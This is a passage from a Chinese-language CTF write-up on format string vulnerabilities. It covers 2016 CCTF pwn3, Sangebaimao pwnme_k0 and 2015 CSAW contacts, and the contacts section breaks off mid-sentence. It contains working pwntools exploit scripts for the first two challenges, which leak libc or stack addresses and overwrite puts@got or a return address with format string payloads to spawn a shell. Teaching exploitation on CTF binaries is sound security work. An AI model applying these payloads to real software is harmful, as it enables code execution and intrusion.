-*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : filename.py from pwn import * context.log_level = 'debug' p = process(\"./pwn3\") elf = ELF(\"./pwn3\") libc = ELF(\"./libc.so\") def creat(name,content): p.recvuntil(\"ftp>\") p.sendline(\"put\") p.recvuntil(\"upload:\") p.sendline(name) p.recvuntil(\"content:\") p.sendline(content) def show(name): p.recvuntil(\"ftp>\") p.sendline(\"get\") p.recvuntil(\"get:\") p.sendline(name) def showlist(): p.recvuntil(\"ftp>\") p.sendline(\"dir\") name = \"rxraclhm\" puts_got = elf.got['puts'] log.info(\"puts_got:\"+hex(puts_got)) p.recvuntil(\"Rainism):\") p.sendline(name) # leak libc payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4)) log.info(\"puts_leak:\"+hex(puts_leak)) libc_base = puts_leak - libc.symbols['puts'] log.info(\"libc_base:\"+hex(libc_base)) system = libc_base + libc.symbols['system'] log.info(\"system:\"+hex(system)) binsh = libc_base + libc.search('/bin/sh').next() log.info(\"binsh:\"+hex(binsh)) onegadget = libc_base + 0x3ac62 log.info(\"onegadget:\"+hex(onegadget)) # 1:overcover puts@got 2 system@got #payload = fmtstr_payload(7, {puts_got: system}) #creat('/bin/sh;', payload) #show('/bin/sh;') #showlist() # 2:overcover puts@got 2 onegadget payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb') p.interactive() exp \u66ff\u6362\u6211\u5199\u5f97\u7248\u672c\uff0c\u8fd9\u6761\u9898\u76ee\u7684\u5b8c\u6574 WP \uff1a 2016_CCTF_pwn3_writeup \u6ce8\u610f \u6211\u5728\u83b7\u53d6 puts \u51fd\u6570\u5730\u5740\u65f6\u4f7f\u7528\u7684\u504f\u79fb\u662f 8\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u5e0c\u671b\u6211\u8f93\u51fa\u7684\u524d 4 \u4e2a\u5b57\u8282\u5c31\u662f puts \u51fd\u6570\u7684\u5730\u5740\u3002\u5176\u5b9e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u9996\u5730\u5740\u7684\u504f\u79fb\u662f 7\u3002 \u6ce8\u89e3 \uff1a\u7ed3\u5408 payload \u6765\u770b\uff1a payload = \"%8$s\" + p32(puts_got) \uff0c %8$S \u957f\u5ea6\u4e3a 0x4 \uff0c\u504f\u79fb\u4e3a 7\uff1b p32(puts_got) \u957f\u5ea6\u4e3a 0x4 \uff0c\u504f\u79fb\u4e3a 8 ; \u8fd9\u91cc\u6211\u5229\u7528\u4e86 pwntools \u4e2d\u7684 fmtstr_payload \u51fd\u6570\uff0c\u6bd4\u8f83\u65b9\u4fbf\u83b7\u53d6\u6211\u4eec\u5e0c\u671b\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u67e5\u770b\u5b98\u65b9\u6587\u6863\u5c1d\u8bd5\u3002\u6bd4\u5982\u8fd9\u91cc fmtstr_payload(7, {puts_got: system_addr}) \u7684\u610f\u601d\u5c31\u662f\uff0c\u6211\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f 7\uff0c\u6211\u5e0c\u671b\u5728 puts_got \u5730\u5740\u5904\u5199\u5165 system_addr \u5730\u5740\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662f\u6309\u7167\u5b57\u8282\u6765\u5199\u7684\u3002 hijack retaddr \u539f\u7406 \u5f88\u5bb9\u6613\u7406\u89e3\uff0c\u6211\u4eec\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u6765\u52ab\u6301\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u5230\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u5730\u5740\u3002 \u4f8b\u5b50 \u8fd9\u91cc\u6211\u4eec\u4ee5 \u4e09\u4e2a\u767d\u5e3d - pwnme_k0 \u4e3a\u4f8b\u8fdb\u884c\u5206\u6790\u3002 \u786e\u5b9a\u4fdd\u62a4 \u279c \u4e09\u4e2a\u767d\u5e3d-pwnme_k0 git:(master) \u2717 checksec pwnme_k0 Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u4ee5\u53ca Full RELRO \u4fdd\u62a4\u3002\u8fd9\u6211\u4eec\u5c31\u6ca1\u6709\u529e\u6cd5\u4fee\u6539\u7a0b\u5e8f\u7684 got \u8868\u4e86\u3002 \u5206\u6790\u7a0b\u5e8f \u7b80\u5355\u5206\u6790\u4e00\u4e0b\uff0c\u5c31\u77e5\u9053\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7c7b\u4f3c\u8d26\u6237\u6ce8\u518c\u4e4b\u7c7b\u7684\u529f\u80fd\uff0c\u4e3b\u8981\u6709\u4fee\u6539\u67e5\u770b\u529f\u80fd\uff0c\u7136\u540e\u53d1\u73b0\u5728\u67e5\u770b\u529f\u80fd\u4e2d\u53d1\u73b0\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e int __usercall sub_400B07@<eax>(char format@<dil>, char formata, __int64 a3, char a4) { write(0, \"Welc0me to sangebaimao!\\n\", 0x1AuLL); printf(&formata, \"Welc0me to sangebaimao!\\n\"); return printf(&a4 + 4); } \u5176\u8f93\u51fa\u7684\u5185\u5bb9\u4e3a &a4 + 4\u3002\u6211\u4eec\u56de\u6eaf\u4e00\u4e0b\uff0c\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684 password \u5185\u5bb9\u4e5f\u662f v6 = read(0, (char *)&a4 + 4, 0x14uLL); \u5f53\u7136\u6211\u4eec\u8fd8\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684 username \u5728\u8ddd\u79bb\u7684 password 20 \u4e2a\u5b57\u8282\u3002 puts(\"Input your username(max lenth:20): \"); fflush(stdout); v8 = read(0, &bufa, 0x14uLL); if ( v8 && v8 <= 0x14u ) { puts(\"Input your password(max lenth:20): \"); fflush(stdout); v6 = read(0, (char *)&a4 + 4, 0x14uLL); fflush(stdout); *(_QWORD *)buf = bufa; *(_QWORD *)(buf + 8) = a3; *(_QWORD *)(buf + 16) = a4; \u597d\uff0c\u8fd9\u5c31\u5dee\u4e0d\u591a\u4e86\u3002\u6b64\u5916\uff0c\u4e5f\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u8d26\u53f7\u5bc6\u7801\u5176\u5b9e\u6ca1\u5565\u914d\u5bf9\u4e0d\u914d\u5bf9\u7684\u3002 \u5229\u7528\u601d\u8def \u6211\u4eec\u6700\u7ec8\u7684\u76ee\u7684\u662f\u5e0c\u671b\u53ef\u4ee5\u83b7\u5f97\u7cfb\u7edf\u7684 shell\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u7ed9\u5b9a\u7684\u6587\u4ef6\u4e2d\uff0c\u5728 0x00000000004008A6 \u5730\u5740\u5904\u6709\u4e00\u4e2a\u76f4\u63a5\u8c03\u7528 system('bin/sh') \u7684\u51fd\u6570\uff08\u5173\u4e8e\u8fd9\u4e2a\u7684\u53d1\u73b0\uff0c\u4e00\u822c\u90fd\u4f1a\u73b0\u5728\u7a0b\u5e8f\u5927\u81f4\u770b\u4e00\u4e0b\u3002\uff09\u3002\u90a3\u5982\u679c\u6211\u4eec\u4fee\u6539\u67d0\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u8fd9\u4e2a\u5730\u5740\uff0c\u90a3\u5c31\u76f8\u5f53\u4e8e\u83b7\u5f97\u4e86 shell\u3002 \u867d\u7136\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5185\u5b58\u672c\u8eab\u662f\u52a8\u6001\u53d8\u5316\u7684\uff0c\u4f46\u662f\u5176\u76f8\u5bf9\u4e8e rbp \u7684\u5730\u5740\u5e76\u4e0d\u4f1a\u6539\u53d8\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\u6765\u8ba1\u7b97\u3002 \u6ce8\u89e3 \uff1a \u4e0a\u9762\u8fd9\u53e5\u8bdd\u53ef\u4ee5\u8fd9\u6837\u7406\u89e3\uff1a\u6709\u4e00\u4e2a\u72ec\u7acb\u51fd\u6570 A \u7684\u6808\u5e27\uff0c\u8fd9\u4e2a A \u6808\u5e27\u6574\u4f53\u5b58\u653e\u5730\u5740\u662f\u52a8\u6001\u53d8\u5316\u7684\u3002\u4f46\u662f A \u6808\u5e27\u5185\u90e8\u7684\u7ed3\u6784\u662f\u56fa\u5b9a\u7684\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff1arbp \u4e00\u5b9a\u5728 rip \u524d\u9762\uff08\u4f4e\u5730\u5740\uff09\u3002\u8fd8\u6709\u6211\u4eec\u77e5\u9053\u7684\u662f rbp \u5b58\u50a8\u7684\u662f\u4e0a\u4e00\u4e2a\u6808\u5e27\u7684 rbp \u5730\u5740\uff0c\u5982\u679c\u8bf4\u6bcf\u6b21\u90fd\u662f\u901a\u8fc7\u51fd\u6570 B \u8c03\u7528\u51fd\u6570 A \uff0c\u56e0\u4e3aAB \u6808\u5e27\u957f\u5ea6&\u7ed3\u6784\u56fa\u5b9a\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u6cc4\u9732\u51fd\u6570 A rbp \u7684\u503c\u51cf\u53bb\u504f\u79fb\u5f97\u5230\u51fd\u6570 A rip \u5730\u5740\u3002 \u5229\u7528\u601d\u8def\u5982\u4e0b \u786e\u5b9a\u504f\u79fb \u83b7\u53d6\u51fd\u6570\u7684 rbp \u4e0e\u8fd4\u56de\u5730\u5740 \u6839\u636e\u76f8\u5bf9\u504f\u79fb\u83b7\u53d6\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740 \u5c06\u6267\u884c system \u51fd\u6570\u8c03\u7528\u7684\u5730\u5740\u5199\u5165\u5230\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002 \u786e\u5b9a\u504f\u79fb \u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u786e\u5b9a\u4e00\u4e0b\u504f\u79fb\u3002\u8f93\u5165\u7528\u6237\u540d aaaaaaaa\uff0c\u5bc6\u7801\u968f\u4fbf\u8f93\u5165\uff0c\u65ad\u70b9\u4e0b\u5728\u8f93\u51fa\u5bc6\u7801\u7684\u90a3\u4e2a printf(&a4 + 4) \u51fd\u6570\u5904 Register Account first! Input your username(max lenth:20): aaaaaaaa Input your password(max lenth:20): %p%p%p%p%p%p%p%p%p%p Register Success!! 1.Sh0w Account Infomation! 2.Ed1t Account Inf0mation! 3.QUit sangebaimao:( >error options 1.Sh0w Account Infomation! 2.Ed1t Account Inf0mation! 3.QUit sangebaimao:( >1 ... \u6b64\u65f6\u6808\u7684\u60c5\u51b5\u4e3a \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500 0x400b1a call 0x400758 0x400b1f lea rdi, [rbp+0x10] 0x400b23 mov eax, 0x0 \u2192 0x400b28 call 0x400770 \u21b3 0x400770 jmp QWORD PTR [rip+0x20184a] # 0x601fc0 0x400776 xchg ax, ax 0x400778 jmp QWORD PTR [rip+0x20184a] # 0x601fc8 0x40077e xchg ax, ax \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80 \u2192 0x00007fffffffdc30 \u2192 0x0000000000400eb0 \u2192 push r15 \u2190 $rsp, $rbp 0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74 \u2192 add rsp, 0x30 0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\" \u2190 $rdi 0x00007fffffffdb58\u2502+0x18: 0x000000000000000a 0x00007fffffffdb60\u2502+0x20: 0x7025702500000000 0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\" 0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\" 0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d \u2192 cmp eax, 0x2 \u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8f93\u5165\u7684\u7528\u6237\u540d\u5728\u6808\u4e0a\u7b2c\u4e09\u4e2a\u4f4d\u7f6e\uff0c\u90a3\u4e48\u9664\u53bb\u672c\u8eab\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\uff0c\u5176\u504f\u79fb\u4e3a\u4e3a 5 + 3 = 8\u3002 \u6ce8\u89e3 \uff1a \u8fd9\u91cc\u6211\u8fd8\u662f\u7528\u6211\u4e60\u60ef\u7684\u65b9\u6cd5\uff0c\u8f93\u51fa\u51e0\u4e2a %p \u76f4\u63a5\u6570\u51fa\u6765\u504f\u79fb\u3002 \u4fee\u6539\u5730\u5740 \u6211\u4eec\u518d\u4ed4\u7ec6\u89c2\u5bdf\u4e0b\u65ad\u70b9\uff08b printf\uff09\u5904\u6808\u7684\u4fe1\u606f 0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80 \u2192 0x00007fffffffdc30 \u2192 0x0000000000400eb0 \u2192 push r15 \u2190 $rsp, $rbp 0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74 \u2192 add rsp, 0x30 0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\" \u2190 $rdi 0x00007fffffffdb58\u2502+0x18: 0x000000000000000a 0x00007fffffffdb60\u2502+0x20: 0x7025702500000000 0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\" 0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\" 0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d \u2192 cmp eax, 0x2 \u53ef\u4ee5\u770b\u5230\u6808\u4e0a\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\u5b58\u50a8\u7684\u5c31\u662f\u8be5\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740 (\u5176\u5b9e\u4e5f\u5c31\u662f\u8c03\u7528 show account \u51fd\u6570\u65f6\u6267\u884c push rip \u6240\u5b58\u50a8\u7684\u503c)\uff0c\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\u4e3a 7\u3002 \u4e0e\u6b64\u540c\u65f6\u6808\u4e0a\uff0c\u7b2c\u4e00\u4e2a\u5143\u7d20\u5b58\u50a8\u7684\u4e5f\u5c31\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684 rbp\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u504f\u79fb 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38\u3002\u7ee7\u800c\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86 rbp \u7684\u6570\u503c\uff0c\u5c31\u77e5\u9053\u4e86\u51fd\u6570\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002 0x0000000000400d74 \u4e0e 0x00000000004008A6 \u53ea\u6709\u4f4e 2 \u5b57\u8282\u4e0d\u540c\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u53ea\u4fee\u6539 0x00007fffffffdb48 \u5f00\u59cb\u7684 2 \u4e2a\u5b57\u8282\u3002 \u8fd9\u91cc\u9700\u8981\u8bf4\u660e\u7684\u662f \u5728\u67d0\u4e9b\u8f83\u65b0\u7684\u7cfb\u7edf (\u5982 ubuntu 18.04) \u4e0a, \u76f4\u63a5\u4fee\u6539\u8fd4\u56de\u5730\u5740\u4e3a 0x00000000004008A6 \u65f6\u53ef\u80fd\u4f1a\u53d1\u751f\u7a0b\u5e8f crash , \u8fd9\u65f6\u53ef\u4ee5\u8003\u8651\u4fee\u6539\u8fd4\u56de\u5730\u5740\u4e3a 0x00000000004008AA, \u5373\u76f4\u63a5\u8c03\u7528 system(\"/bin/sh\") \u5904 .text:00000000004008A6 sub_4008A6 proc near .text:00000000004008A6 ; __unwind { .text:00000000004008A6 push rbp .text:00000000004008A7 mov rbp, rsp .text:00000000004008AA <- here mov edi, offset command ; \"/bin/sh\" .text:00000000004008AF call system .text:00000000004008B4 pop rdi .text:00000000004008B5 pop rsi .text:00000000004008B6 pop rdx .text:00000000004008B7 retn \u5229\u7528\u7a0b\u5e8f #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : pwnme_k0.py from pwn import * context.log_level = 'debug' p = process(\"./pwnme_k0\") elf = ELF(\"./pwnme_k0\") # leak stack addr payload = 'a'*0x8 + \"%6$p\" p.recvuntil(\"20): \\n\") p.send(payload) p.recvuntil(\"20): \\n\") p.send(payload) p.recvuntil('>') #gdb.attach(p,'b printf') p.sendline('1') p.recvuntil('a'*0x8) stack_leak = int(p.recv(14),16) - 0x38 log.info(\"stack_leak:\"+hex(stack_leak)) # hijack retaddr payload1 = p64(stack_leak) payload2 = \"%2218d%8$hn\" p.recvuntil('>') p.sendline('2') p.recvuntil(\"20): \\n\") p.sendline(payload1) p.recvuntil(\"20): \\n\") p.sendline(payload2) p.recvuntil('>') p.sendline('1') p.interactive() \u6ce8\u89e3 \uff1a \u6cc4\u9732\u5730\u5740\u7684\u65f6\u5019\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7528\u7684\u662f %p \uff0c\u5982\u679c\u7528 %s \u518d u64 \u6cc4\u9732\u51fa\u6765\u7684\u662f\u51fd\u6570 B \u7684 rbp \u7684\u503c\u3002\u539f\u56e0\u4e5f\u5f88\u7b80\u5355\uff0c\u8981\u6c42\u8f93\u51fa\u7684\u662f\u5b57\u7b26\uff0c\u7cfb\u7edf\u5230\u51fd\u6570 A rbp \u7684\u503c\u6307\u5411\u7684\u5730\u5740\u53d6\u503c\uff0c\u4e5f\u5c31\u662f\u51fd\u6570 B \u7684\u503c\u3002\u5982\u679c\u662f %p \u5c31\u5c06\u51fd\u6570 A rbp \u7684\u503c\u8f93\u51fa\u3002 hijack \u90e8\u5206\u7684 payload \uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53ef\u4ee5\u653e\u5230 name \u8f93\u5165\uff0c\u4e5f\u5c31\u662f\u548c stack_leak \u4e00\u8d77\u8f93\u5165\uff0cpassword \u5c31\u968f\u4fbf\u8f93\u5165\u70b9\u4e1c\u897f\u884c\u4e86\u3002\u8fd9\u91cc\u56e0\u4e3a\u8f93\u5165\u957f\u5ea6\u73b0\u5728\uff0c\u6240\u4ee5\u6ca1\u6709\u4f7f\u7528\u6700\u7a33\u59a5\u7684 \u5355\u5b57\u8282 \u8f93\u5165\uff0c\u800c\u662f\u53cc\u5b57\u8282\u3002 \u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e \u539f\u7406 \u6240\u8c13\u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6307\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u672c\u8eab\u5b58\u50a8\u5728\u5806\u4e0a\uff0c\u8fd9\u4e2a\u4e3b\u8981\u589e\u52a0\u4e86\u6211\u4eec\u83b7\u53d6\u5bf9\u5e94\u504f\u79fb\u7684\u96be\u5ea6\uff0c\u800c\u4e00\u822c\u6765\u8bf4\uff0c\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u90fd\u662f\u5f88\u6709\u53ef\u80fd\u88ab\u590d\u5236\u5230\u6808\u4e0a\u7684\u3002\uff08\u51fa\u73b0\u60c5\u51b5\u5c31\u50cf\u4e0b\u9762\u4f8b\u5b50\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u672c\u8eab\u5b58\u50a8\u5728\u5806\u4e0a\uff0c\u5b57\u7b26\u6307\u9488\u6307\u5411\u6808\u4e0a\uff0c\u51fa\u73b0\u7684\u60c5\u51b5\u662f\u6211\u4eec\u4e0d\u80fd\u5bb9\u6613\u63a7\u5236\u5199\u5165\u7684\u5730\u5740\uff09 \u4f8b\u5b50 \u8fd9\u91cc\u6211\u4eec\u4ee5 2015 \u5e74 CSAW \u4e2d\u7684 contacts \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u786e\u5b9a\u4fdd\u62a4 \u279c 2015-CSAW-contacts git:(master) \u2717 checksec contacts Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e0d\u4ec5\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u8fd8\u5f00\u542f\u4e86 Canary\u3002\uff08RELRO \u534a\u4fdd\u62a4\uff0c\u6211\u4eec\u662f\u4e0d\u662f\u80fd hijack got \u8868\u5462\uff1fhijack retaddr \u5462\uff1f\uff09 \u5206\u6790\u7a0b\u5e8f \u7b80\u5355\u770b\u770b\u7a0b\u5e8f\uff0c\u53d1\u73b0\u7a0b\u5e8f\u6b63\u5982\u540d\u5b57\u6240\u63cf\u8ff0\u7684\uff0c\u662f\u4e00\u4e2a\u8054\u7cfb\u4eba\u76f8\u5173\u7684\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5b9e\u73b0\u521b\u5efa\uff0c\u4fee\u6539\uff0c\u5220\u9664\uff0c\u6253\u5370\u8054\u7cfb\u4eba\u7684\u4fe1\u606f\u3002\u800c\u518d\u4ed4\u7ec6\u9605\u8bfb\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u6253\u5370\u8054\u7cfb\u4eba\u4fe1\u606f\u7684\u65f6\u5019\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002 int __cdecl PrintInfo(int a1, int a2, int a3, char *format) { printf(\"\\tName: %s\\n\", a1); printf(\"\\tLength %u\\n\", a2); printf(\"\\tPhone #: %s\\n\", a3); printf(\"\\tDescription: \"); return printf(format); //\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e } \u4ed4\u7ec6\u770b\u770b\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a format \u5176\u5b9e\u662f\u6307\u5411\u5806\u4e2d\u7684\u3002 \u6ce8\u89e3 \uff1a\u53ef\u4ee5\u4ece\u8c03\u7528 PrintInfo \u7684\u4e0a\u5c42\u51fd\u6570\u67e5\u770b\u6700\u540e\u4e00\u4e2a\u53c2\u6570\uff1a\uff08v2 \u662f\u7ed3\u6784\u4f53\u94fe\u8868\uff09 sub_8048BD1(v2 + 8, *(_DWORD *)(v2 + 72), *(_DWORD *)(v2 + 4), *(char **)v2); \u5229\u7528\u601d\u8def \u6211\u4eec\u7684\u57fa\u672c\u76ee\u7684\u662f\u83b7\u53d6\u7cfb\u7edf\u7684 shell\uff0c\u4ece\u800c\u62ff\u5230 flag\u3002\u5176\u5b9e\u65e2\u7136\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u5e94\u8be5\u662f\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301 got \u8868\u6216\u8005\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002\u4f46\u662f\u8fd9\u91cc\u5374\u4e0d\u600e\u4e48\u53ef\u884c\u3002\u539f\u56e0\u5206\u522b\u5982\u4e0b \u4e4b\u6240\u4ee5\u4e0d\u80fd\u591f\u52ab\u6301 got \u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u53d1\u73b0\u5bf9\u4e8e\u7a0b\u5e8f\u4e2d\u5e38\u89c1\u7684\u53ef\u4ee5\u5bf9\u4e8e\u6211\u4eec\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\u8f93\u51fa\u7684\u53ea\u6709 printf \u51fd\u6570\uff0c\u6211\u4eec\u53ea\u6709\u9009\u62e9\u5b83\u624d\u53ef\u4ee5\u6784\u9020 /bin/sh \u8ba9\u5b83\u6267\u884c system('/bin/sh')\uff0c\u4f46\u662f printf \u51fd\u6570\u5728\u5176\u4ed6\u5730\u65b9\u4e5f\u5747\u6709\u7528\u5230\uff0c\u8fd9\u6837\u505a\u4f1a\u4f7f\u5f97\u7a0b\u5e8f\u76f4\u63a5\u5d29\u6e83\u3002 \u6ce8\u89e3 \u6362\u53e5\u4eba\u8bdd\u5c31\u662f\uff1a\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c\u6211\u4eec\u80fd\u63a7\u5236\u8f93\u5165\u53c2\u6570\u7684\u51fd\u6570\u5c31\u53ea\u6709 printf \uff0c\u8bf8\u5982 puts \u7b49\u7684\u53c2\u6570\u90fd\u662f\u6211\u4eec\u4e0d\u53ef\u63a7\u7684\u3002\u56e0\u4e3a\u4fee\u6539 got \u8868\u4e4b\u540e\u6211\u4eec\u9700\u8981\u4f20\u5165 binsh \u7684\u5730\u5740\uff0c\u6240\u4ee5\u53ea\u80fd\u9009\u62e9 printf \u3002\u4f46\u662f\u9009\u62e9 printf \u53c8\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u4fee\u6539\u5b8c\u540e\uff0cprintf \u5404\u4e2a\u5730\u65b9\u90fd\u4f1a\u7528\u5230\uff0c\u8fd8\u6ca1\u8fd0\u884c\u5230\u6211\u4eec\u80fd\u8f93\u5165\u53c2\u6570\u7684\u5730\u65b9\uff0c\u7a0b\u5e8f\u5c31\u5df2\u7ecf\u6302\u903c\u4e86\u3002 \u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u539f\u56e0 wiki \u4e2d\u6ca1\u6709\u63d0\u53ca\uff0c\u90a3\u5c31\u662f\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u5199\u5165\u5730\u5740\u3002\u539f\u56e0\u5f88\u7b80\u5355\uff1a\u901a\u8fc7\u5206\u6790\u7a0b\u5e8f\u77e5\u9053\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u662f\u5b58\u653e\u5728\u5806\u4e0a\uff0c\u800c\u5b57\u7b26\u4e32\u6307\u9488\u662f\u5728\u6808\u4e0a\uff0c\u5f88\u660e\u663e\u7684\u73b0\u8c61\u5c31\u662f\u6808\u4e0a\u4e0d\u662f\u5b57\u7b26\u4e32\u7684\u660e\u6587\uff0c\u800c\u662f\u5b57\u7b26\u4e32\u7684\u5806\u5730\u5740\uff0c\u5c31\u7b97\u6211\u4eec\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u8f93\u5165\u76ee\u6807\u5730\u5740\uff0c\u4e5f\u4e0d\u80fd\u901a\u8fc7\u504f\u79fb\u83b7\u53d6\u3002\uff08\u8fd9\u4e2a\u7a0b\u5e8f\u5168\u90e8\u53ef\u63a7\u8f93\u5165\u90fd\u653e\u5728\u5806\u4e0a\uff09\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u8f93\u5165\u76ee\u6807\u5730\u5740\uff0c\u627e\u6808\u4e0a\u73b0\u6709\u7684\u5730\u5740\u3002 \u8d85\u957f\u504f\u79fb\u80fd\u53d6\u5230\u503c\uff1f\u6211\u4eec\u5f53\u5b83\u662f\u53ef\u884c\u7684\u8bd5\u4e00\u8bd5\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5230\u63cf\u8ff0\u5806\u5757\u76f8\u5dee -0xf7fafed0 \uff0c\u504f\u79fb\u4e3a -1040105396 \uff0c\u6784\u9020\u5c1d\u8bd5\u4e00\u4e0b\uff1a \u5176\u6b21\uff0c\u4e0d\u80fd\u591f\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u7684\u662f\u56e0\u4e3a\u6211\u4eec\u5e76\u6ca1\u6709\u4e00\u5757\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u7684\u5730\u5740\u6765\u5b58\u50a8\u6211\u4eec\u7684\u5185\u5bb9\uff0c\u540c\u65f6\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u5f80\u6808\u4e0a\u76f4\u63a5\u5199\u5165 system_addr + 'bbbb' + addr of '/bin/sh\u2018 